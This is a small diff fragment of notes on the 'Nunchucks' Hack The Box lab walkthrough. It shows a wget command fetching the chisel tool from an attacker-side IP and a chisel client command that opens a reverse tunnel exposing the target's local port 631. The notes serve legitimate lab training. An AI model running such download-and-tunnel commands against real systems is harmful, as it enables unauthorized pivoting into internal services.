@@ -68,7 +68,7 @@ wget 10.10.14.93/chisel_1.7.7_linux_amd64
 ./chisel_1.7.7_linux_amd64 client 10.10.14.93:5000 R:5432:localhost:631
 
 
-T
+
 
 Challenge Name: Nunchucks Hackthebox Walkthrough
 Challenge URL: https://www.hackingarticles.in/nunchucks-hackthebox-walkthrough/
